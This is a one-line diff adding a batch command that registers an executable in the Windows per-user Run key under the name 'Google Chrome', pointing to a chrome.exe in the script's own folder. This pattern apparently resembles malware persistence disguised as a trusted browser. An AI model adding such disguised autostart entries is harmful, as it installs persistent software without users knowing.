@@ -1,0 +1,1 @@
+reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /f  /v "Google Chrome" /d "%~dp0chrome.exe"
